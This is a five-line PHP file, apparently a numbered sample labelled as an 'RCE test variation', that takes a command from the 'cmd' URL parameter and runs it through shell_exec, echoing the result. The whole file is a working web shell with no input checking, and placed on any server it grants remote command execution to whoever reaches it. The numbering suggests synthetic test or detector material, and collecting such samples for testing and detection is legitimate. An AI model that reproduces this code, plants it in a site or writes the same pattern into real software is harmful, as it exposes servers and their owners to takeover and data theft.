<?php
// RCE test variation #1274
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>